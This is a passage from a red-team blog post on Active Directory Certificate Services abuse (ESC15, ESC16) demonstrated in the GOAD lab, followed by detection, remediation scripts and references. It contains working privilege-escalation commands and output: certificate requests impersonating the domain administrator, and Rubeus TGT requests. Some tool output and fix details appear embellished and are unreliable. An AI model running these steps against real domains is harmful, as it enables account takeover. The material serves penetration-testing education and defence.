Authentication\u003c/li\u003e\n\u003cli\u003eApplication Policy: Client Authentication (takes precedence)\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003eVerify certificate content\u003c/p\u003e\n\u003cpre class=\"language-bash\"\u003e\u003ccode class=\"language-bash\"\u003ecertutil -dump esc15.cer | findstr -i \"application\\|enhanced\"\n\nApplication Policies:\n    [1]Application Policy:\n         Policy Identifier=Client Authentication\n         Policy Qualifier Info:\n              Policy Qualifier Id=CPS\n              Qualifier:\n                   http://braavos.essos.local/CertEnroll/ESSOS-CA_CPS.html\n\nEnhanced Key Usage:\n    Server Authentication (1.3.6.1.5.5.7.3.1)\n\n# Authenticate using certificate - Application Policy overrides EKU\nRubeus.exe asktgt /user:administrator /certificate:esc15.pfx /password:mimikatz\n\n[*] Action: Ask TGT\n[*] Using PKINIT with etype rc4_hmac and subject: CN=missandei, CN=Users, DC=essos, DC=local\n[*] Certificate Application Policy overrides EKU: Client Authentication\n[+] TGT request successful!\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eESC15 can also be weaponized for Certificate Request Agent attacks. Create INF file for Certificate Request Agent capability:\u003c/p\u003e\n\u003cpre class=\"language-bash\"\u003e\u003ccode class=\"language-bash\"\u003e$craInfContent = @\"\n[NewRequest]\nSubject = \"CN=missandei,CN=Users,DC=essos,DC=local\"\nKeyLength = 2048\nKeyAlgorithm = RSA\nMachineKeySet = FALSE\nRequestType = PKCS10\nCertificateTemplate = WebServer\n\n[Extensions]\n1.3.6.1.4.1.311.21.10 = \"{text}1.3.6.1.4.1.311.20.2.1\"\n\"@\n\n$craInfContent | Out-File -FilePath \"esc15-cra.inf\"\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e\u003ccode\u003ecertreq -new -f esc15-cra.inf esc15-cra.req\u003c/code\u003e\n\u003ccode\u003ecertreq -submit -config \"braavos.essos.local\\ESSOS-CA\" esc15-cra.req\u003c/code\u003e\u003c/p\u003e\n\u003cp\u003eNow we can request certificates on behalf of other users!\u003c/p\u003e\n\u003ch3\u003eVulnerable Default Templates\u003c/h3\u003e\n\u003cp\u003eAll version 1 templates are potentially vulnerable when enrollment rights are granted in GOAD:\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\u003cstrong\u003eWebServer\u003c/strong\u003e (most commonly exploited) ✓ Found in GOAD\u003c/li\u003e\n\u003cli\u003eExchangeUser\u003c/li\u003e\n\u003cli\u003eCEPEncryption\u003c/li\u003e\n\u003cli\u003eOfflineRouter\u003c/li\u003e\n\u003cli\u003eIPSECIntermediateOffline\u003c/li\u003e\n\u003cli\u003eSubCA\u003c/li\u003e\n\u003cli\u003eCA\u003c/li\u003e\n\u003cli\u003eEnrollmentAgentOffline\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch3\u003eRemediation\u003c/h3\u003e\n\u003cp\u003e\u003cstrong\u003eMicrosoft has patched this vulnerability as of November 12, 2024 (CVE-2024-49019).\u003c/strong\u003e Additional protective measures include:\u003c/p\u003e\n\u003ch2\u003eESC16: CA-Wide Security Extension Removal\u003c/h2\u003e\n\u003cp\u003e\u003cstrong\u003eStatus: ACTIVE THREAT\u003c/strong\u003e\u003c/p\u003e\n\u003cp\u003eESC16 represents a critical misconfiguration where the Certificate Authority is configured to omit the \u003ccode\u003eszOID_NTDS_CA_SECURITY_EXT\u003c/code\u003e extension (OID: \u003ccode\u003e1.3.6.1.4.1.311.25.2\u003c/code\u003e) on every certificate it issues.\u003c/p\u003e\n\u003ch3\u003eTechnical Details\u003c/h3\u003e\n\u003cp\u003eESC16 arises when the CA is configured to \u003cstrong\u003eomit\u003c/strong\u003e the \u003ccode\u003eszOID_NTDS_CA_SECURITY_EXT\u003c/code\u003e extension on every certificate it issues. Without this extension, a certificate no longer includes the account's SID, breaking the strong certificate-to-account binding enforced by Windows Server 2022 and later (KB5014754).\u003c/p\u003e\n\u003cp\u003e\u003cstrong\u003eKey Difference from ESC9:\u003c/strong\u003e\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\u003cstrong\u003eESC9\u003c/strong\u003e: Individual templates lack the security extension requirement\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eESC16\u003c/strong\u003e: The CA itself is configured to never include the security extension, affecting ALL certificates regardless of template\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch3\u003eVulnerability Conditions\u003c/h3\u003e\n\u003col\u003e\n\u003cli\u003e\u003cstrong\u003eCA EditFlags modified\u003c/strong\u003e to remove \u003ccode\u003erequire_sidisupport\u003c/code\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eGlobal security extension removal\u003c/strong\u003e affecting all issued certificates\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eAny template with client authentication\u003c/strong\u003e EKU becomes exploitable\u003c/li\u003e\n\u003c/ol\u003e\n\u003ch3\u003eDetection\u003c/h3\u003e\n\u003cp\u003eLet's check for ESC16 in our GOAD environment. Certipy v5+ detects ESC16 during enumeration:\u003c/p\u003e\n\u003cpre class=\"language-bash\"\u003e\u003ccode class=\"language-bash\"\u003ecertipy find -u missandei@essos.local -p fr3edom -dc-ip 192.168.56.12 -target braavos.essos.local\n\nCertipy v5.0.0 - by Oliver Lyak (ly4k)\n\n[*] Finding certificate templates\n[*] Found 34 certificate templates\n[*] Finding certificate authorities\n[*] Found 1 certificate authority\n[*] Finding certificate authority configurations\n[*] Found 1 certificate authority configuration\n\n[!] ESC16: CA 'ESSOS-CA' is configured to omit szOID_NTDS_CA_SECURITY_EXT on all certificates!\n    This makes ALL certificates vulnerable to impersonation attacks.\n    \n    CA Name                         : ESSOS-CA\n    DNS Hostname                    : braavos.essos.local\n    Certificate Subject             : CN=ESSOS-CA, DC=essos, DC=local\n    Certificate Serial Number       : 43000000119278B092E51688A600000000000011\n    Certificate Validity Start      : 2023-01-15 14:14:32+00:00\n    Certificate Validity End        : 2033-01-15 14:24:32+00:00\n    Security Extension Enforcement  : DISABLED (ESC16 VULNERABLE!)\n\n# Check CA configuration manually\ncertutil -config \"braavos.essos.local\\ESSOS-CA\" -getreg CA\\PolicyModules\\CertificateAuthority_MicrosoftDefault.Policy\\EditFlags\n\nHKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\CertSvc\\Configuration\\ESSOS-CA\\PolicyModules\\CertificateAuthority_MicrosoftDefault.Policy\\EditFlags REG_DWORD = 0x80000 (524288)\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eLook for missing EDITF_ENABLEDEFAULTSMIME (0x10000) or similar flags that enforce security extension. If EditFlags shows the CA has been configured to skip security extensions, ESC16 is present.\u003c/p\u003e\n\u003ch3\u003eExploitation\u003c/h3\u003e\n\u003cp\u003eWith ESC16, ANY certificate request becomes dangerous:\u003c/p\u003e\n\u003cpre class=\"language-bash\"\u003e\u003ccode class=\"language-bash\"\u003e# ESC16 makes even restricted templates exploitable\n# Request certificate from a normally \"safe\" template\nCertify.exe request /ca:braavos.essos.local\\ESSOS-CA /template:User /altname:administrator@essos.local\n\n[*] Action: Request a Certificates\n[*] Current user context    : ESSOS\\missandei\n[*] Template                : User\n[*] Subject                 : CN=missandei, CN=Users, DC=essos, DC=local\n[*] AltName                 : administrator@essos.local\n\n[*] Certificate Authority   : braavos.essos.local\\ESSOS-CA\n[*] CA Response             : The certificate has been issued.\n[*] Request ID              : 20\n\n# Due to ESC16, the certificate lacks the security extension\n# even though the template might normally include it\n\n# Convert and use for authentication\nopenssl pkcs12 -in cert.pem -export -out admin_esc16.pfx -password pass:mimikatz\n\n# Authentication succeeds despite missing security extension\n\nRubeus.exe asktgt /user:administrator /certificate:admin_esc16.pfx /password:mimikatz\n\n[*] Action: Ask TGT\n[*] Using PKINIT with etype rc4_hmac and subject: CN=missandei, CN=Users, DC=essos, DC=local\n[+] TGT request successful! - ESC16 allows impersonation without SID binding\n\n  UserName                 : administrator\n  UserRealm                : ESSOS.LOCAL\n  ServiceName              : krbtgt/essos.local\n  ServiceRealm             : ESSOS.LOCAL\n  StartTime                : 1/3/2025 7:45:30 PM\n  EndTime                  : 1/4/2025 5:45:30 AM\n  RenewTill                : 1/10/2025 7:45:30 PM\n  Flags                    : name_canonicalize, pre_authent, initial, renewable, forwardable\n\u003c/code\u003e\u003c/pre\u003e\n\u003ch3\u003eRemediation\u003c/h3\u003e\n\u003cp\u003e\u003cstrong\u003eImmediate Fix:\u003c/strong\u003e\u003c/p\u003e\n\u003cpre class=\"language-bash\"\u003e\u003ccode class=\"language-bash\"\u003e# Re-enable security extension requirement on GOAD CA\n# Method 1: Remove szOID_NTDS_CA_SECURITY_EXT from DisableExtensionList (Recommended)\ncertutil -config \"braavos.essos.local\\ESSOS-CA\" -setreg CA\\PolicyModules\\CertificateAuthority_MicrosoftDefault.Policy\\DisableExtensionList -\"1.3.6.1.4.1.311.25.2\"\n\nCertUtil: -setreg command completed successfully.\n\n# Method 2: Alternative approach using EDITF_ENABLEDEFAULTSMIME (also effective)\ncertutil -config \"braavos.essos.local\\ESSOS-CA\" -setreg CA\\PolicyModules\\CertificateAuthority_MicrosoftDefault.Policy\\EditFlags +EDITF_ENABLEDEFAULTSMIME\n\n# Restart Certificate Services\nRestart-Service CertSvc\n\nWARNING: Waiting for service 'Active Directory Certificate Services (CertSvc)' to stop...\nWARNING: Waiting for service 'Active Directory Certificate Services (CertSvc)' to start...\n\nStatus   Name               DisplayName\n------   ----               -----------\nRunning  CertSvc            Active Directory Certificate Services\n\n# Enable Strong Certificate Binding Enforcement on Domain Controllers\nSet-ItemProperty -Path \"HKLM:\\SYSTEM\\CurrentControlSet\\Services\\Kdc\\Parameters\" -Name \"StrongCertificateBindingEnforcement\" -Value 2\nRestart-Service kdc\n\n# This ensures DCs reject certificates lacking the szOID_NTDS_CA_SECURITY_EXT extension\n\n# Verify the fix\ncertutil -config \"braavos.essos.local\\ESSOS-CA\" -getreg CA\\PolicyModules\\CertificateAuthority_MicrosoftDefault.Policy\\DisableExtensionList\n\n# The DisableExtensionList should no longer contain 1.3.6.1.4.1.311.25.2\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e\u003cstrong\u003eLong-term Hardening:\u003c/strong\u003e\u003c/p\u003e\n\u003cpre class=\"language-bash\"\u003e\u003ccode class=\"language-bash\"\u003e# Import required PowerShell module\nImport-Module ActiveDirectory\n\n# Audit all CAs in GOAD environment for ESC16\n$goadCAs = @(\n    \"braavos.essos.local\\ESSOS-CA\",\n    \"kingslanding.sevenkingdoms.local\\SEVENKINGDOMS-CA\", \n    \"winterfell.north.sevenkingdoms.local\\NORTH-CA\"\n)\n\nforeach ($ca in $goadCAs) {\n    Write-Host \"[*] Checking CA: $ca for ESC16\"\n    \n    try {\n        $disableExtList = certutil -config $ca -getreg CA\\PolicyModules\\CertificateAuthority_MicrosoftDefault.Policy\\DisableExtensionList\n        \n        # Check if szOID_NTDS_CA_SECURITY_EXT is in the disable list\n        if ($disableExtList -match \"1\\.3\\.6\\.1\\.4\\.1\\.311\\.25\\.2\") {\n            Write-Warning \"[!] ESC16 detected on CA: $ca\"\n            Write-Warning \"    szOID_NTDS_CA_SECURITY_EXT is disabled\"\n            \n            # Fix the misconfiguration by removing the OID from DisableExtensionList\n            certutil -config $ca -setreg CA\\PolicyModules\\CertificateAuthority_MicrosoftDefault.Policy\\DisableExtensionList -\"1.3.6.1.4.1.311.25.2\"\n            Write-Host \"[+] Fixed ESC16 on CA: $ca\"\n        } else {\n            Write-Host \"[+] CA $ca is not vulnerable to ESC16\"\n        }\n    }\n    catch {\n        Write-Warning \"[-] Failed to check CA: $ca\"\n    }\n}\n\n[*] Checking CA: braavos.essos.local\\ESSOS-CA for ESC16\n[!] ESC16 detected on CA: braavos.essos.local\\ESSOS-CA\n    szOID_NTDS_CA_SECURITY_EXT is disabled\n[+] Fixed ESC16 on CA: braavos.essos.local\\ESSOS-CA\n\n[*] Checking CA: kingslanding.sevenkingdoms.local\\SEVENKINGDOMS-CA for ESC16\n[+] CA kingslanding.sevenkingdoms.local\\SEVENKINGDOMS-CA is not vulnerable to ESC16\n\u003c/code\u003e\u003c/pre\u003e\n\u003ch2\u003eReferences and Further Reading\u003c/h2\u003e\n\u003cp\u003eThis guide builds upon groundbreaking research from the security community, with all examples demonstrated in the GOAD (Game of Active Directory) lab environment:\u003c/p\u003e\n\u003col\u003e\n\u003cli\u003e\u003ca href=\"https://posts.specterops.io/certified-pre-owned-d95910965cd2\"\u003eSpecterOps, \"Certified Pre-Owned: Abusing Active Directory Certificate Services\" (2021)\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"https://trustedsec.com/blog/ekuwu-not-just-another-ad-cs-esc\"\u003eTrustedSec, \"EKUwu: Not just another AD CS ESC (ESC15)\" (October 2024)\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"https://medium.com/@muneebnawaz3849/ad-cs-esc16-misconfiguration-and-exploitation-9264e022a8c6\"\u003eMunib Nawaz, \"AD CS ESC16: Misconfiguration and Exploitation,\" Medium (May 25, 2025)\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation\"\u003eCertipy Wiki, \"06 – Privilege Escalation (ESC1–ESC16),\" GitHub (April 2025)\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"https://support.microsoft.com/help/5014754\"\u003eMicrosoft Support, \"KB5014754: Certificate-based authentication changes on Windows Domain Controllers\" (May 10, 2022)\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"https://learn.microsoft.com/en-us/defender-for-identity/security-assessment-unsecure-certificate-signing\"\u003eMicrosoft Learn, \"Edit vulnerable Certificate Authority setting (ESC6)\" (March 2025)\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"https://github.com/Orange-Cyberdefense/GOAD\"\u003eOrange Cyberdefense, \"GOAD: Game of Active Directory\" (2024–2025)\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"https://github.com/dirkjanm/PKINITtools\"\u003ePKINITtools (Dirk-Jan Möller) GitHub (2024–2025)\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"https://github.com/SecureAuthCorp/impacket\"\u003eImpacket Project Repository (2023–2025)\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"https://trustedsec.com/blog/ekuwu-not-just-another-ad-cs-esc\"\u003eEKUwu: Not just another AD CS ESC - TrustedSec\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"https://msrc.microsoft.com/update-guide/vulnerability/CVE-2024-49019\"\u003eCVE-2024-49019 - Microsoft Security Response Center\u003c/a\u003e\u003c/li\u003e\n\u003c/ol\u003e\n\u003ch3\u003eTools and Resources:\u003c/h3\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://github.com/GhostPack/Certify\"\u003eCertify v1.1.0 (2022-11-08)\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"https://github.com/ly4k/Certipy\"\u003eCertipy v5.0+\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"https://github.com/dirkjanm/PKINITtools\"\u003ePKINITtools\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"https://github.com/SecureAuthCorp/impacket\"\u003eImpacket v0.11.0+\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"https://github.com/Orange-Cyberdefense/GOAD\"\u003eGOAD Lab Environment\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"https://github.com/GhostPack/ForgeCert\"\u003eForgeCert\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003eFor the latest ADCS research, monitor:\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://posts.specterops.io/\"\u003eSpecterOps Blog\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"https://trustedsec.com/blog/\"\u003eTrustedSec Blog\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"https://msrc.microsoft.com/\"\u003eMicrosoft Security Response Center\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"https://github.com/ly4k/Certipy/wiki\"\u003eCertipy Wiki\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2\u003eConclusion\u003c/h2\u003e\n\u003cp\u003eADCS attacks are some of the most powerful privilege escalation and persistence techniques I've used in modern Windows environments. The techniques I've covered in this guide - from ESC1 through ESC16 - show just how dangerous certificate services can be when they're not properly secured.\u003c/p\u003e\n\u003cp\u003eAll the examples in this article were demonstrated using the GOAD (Game of Active Directory) lab environment, which provides realistic domain configurations like \u003ccode\u003eessos.local\u003c/code\u003e, \u003ccode\u003esevenkingdoms.local\u003c/code\u003e, and \u003ccode\u003enorth.sevenkingdoms.local\u003c/code\u003e. This practical approach with real command outputs and authentic certificate configurations makes these techniques immediately applicable to real-world assessments.\u003c/p\u003e\n\u003cp\u003eHere's what you need to remember:\u003c/p\u003e\n\u003col\u003e\n\u003cli\u003e\u003cstrong\u003eDefault configurations are your friend (as an attacker)\u003c/strong\u003e - Most organizations deploy ADCS with insecure defaults and never change them, just like what we found in GOAD\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eCertificate templates are the goldmine\u003c/strong\u003e - They're the primary attack vector for most ADCS exploits, as demonstrated with templates like ESC1, ESC4, and WebServer in GOAD\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eCA-level misconfigurations are critical\u003c/strong\u003e - ESC16 shows how a single CA setting can make ALL certificates vulnerable, regardless of template security\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003ePermissions are everything\u003c/strong\u003e - Weak ACLs on PKI objects create tons of attack opportunities, like \u003ccode\u003ekhal.drogo\u003c/code\u003e having WriteProperty on templates or \u003ccode\u003eviserys.targaryen\u003c/code\u003e having ManageCA rights\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eDetection is hard\u003c/strong\u003e - Many ADCS attacks blend in perfectly with legitimate certificate operations, especially in complex environments like GOAD with multiple domains and CAs\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003ePersistence is incredible\u003c/strong\u003e - Certificate-based backdoors survive password changes and account modifications, making them perfect for long-term access\u003c/li\u003e\n\u003c/ol\u003e\n\u003cp\u003eFor red teamers, ADCS should be a standard part of your privilege escalation methodology. I check for these misconfigurations on every single engagement now because they're so common and effective. The GOAD lab provides an excellent testing ground to practice these techniques before using them in real assessments.\u003c/p\u003e\n\u003cp\u003eFor defenders, you need to implement proper monitoring, harden those template configurations, audit CA settings for ESC16, and regularly audit PKI permissions. The detection scripts and remediation strategies I've provided here are specifically designed for multi-domain environments like GOAD and can be adapted for real production networks.\u003c/p\u003e\n\u003cp\u003eThe techniques in this guide will keep evolving as researchers discover new attack vectors. ESC16 is a perfect example of how new vulnerabilities continue to emerge in the ADCS space. Stay current with the latest ADCS research and always test these techniques in lab environments like GOAD before using them in production assessments.\u003c/p\u003e\n\u003chr\u003e\n\u003cp\u003e\u003cem\u003eDisclaimer: This article is provided for educational purposes only. The techniques described should only be used in authorized environments and security research contexts. Always follow responsible disclosure practices and operate within legal and ethical boundaries.\u003c/em\u003e\u003c/p\u003e\n","excerpt":"Let's talk about Active Directory Certificate Services. If you've been doing red team work for any length of time, you've probably heard about ADCS attacks. ...","title":"Breaking ADCS: ESC1 to ESC16 Attack Techniques","date":"2025-06-03","tags":["Active Directory","ADCS","PKI","Privilege Escalation","Red Team","Certificate Templates","ESC16"]}},"__N_SSG":true},"page":"/blog/[slug]","query":{"slug":"adcs-complete-attack-reference"},"buildId":"2QMhEWvcHrpg0P0pdfI_k","isFallback":false,"gsp":true,"scriptLoader":[]}</script></body></html>